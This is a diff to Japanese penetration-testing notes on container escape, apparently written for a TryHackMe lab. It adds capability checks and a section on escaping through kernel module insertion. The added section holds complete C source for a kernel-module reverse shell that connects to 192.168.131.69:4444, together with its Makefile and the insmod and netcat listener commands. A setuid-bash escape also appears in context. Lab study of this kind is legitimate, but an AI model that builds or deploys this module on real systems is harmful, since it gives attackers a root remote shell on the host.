@@ -252,10 +252,10 @@ https://tryhackme.com/room/containervulnerabilitiesDG
 ```sh
 # capabilityの表示
 capsh --print
-
-# CAP_SYS_ADMIN や CAP_SYS_MODULE などが有効な場合、特権コンテナと考えられる。
-
 ```
+
+- CAP_SYS_ADMIN や CAP_SYS_MODULE が有効な場合、特権コンテナと考えられる
+- cap_sys_module が有効な場合、カーネルモジュールのインサートが可能
 
 [capability の種類と、できること](https://linux.die.net/man/7/capabilities)
 
@@ -386,6 +386,58 @@ cp /bin/bash . #From non priv inside mounted folder
 chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
+```
+
+### [カーネルモジュール挿入によるエスケープ](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_module)
+
+1. ゲストOSの root であること
+2. cap_sys_module が付いていること
+3. /proc/sys/kernel/modules_disabled が 0 であること
+4. ゲストOSで make などが使えない場合、不可能ではないかもしれないが難しくなる
+
+hello.c
+
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.131.69/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+
+Makefile。カーネルと一致するバージョンのヘッダーがない場合はエラーになるが、近いバージョンのヘッダーがあれば、そのパスを指定することで成功する場合もある。
+
+```
+obj-m +=hello.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
+```sh
+make
+insmod hello.ko
+
+nc -nlvp 4444
 ```
 
 ## イメージの分析
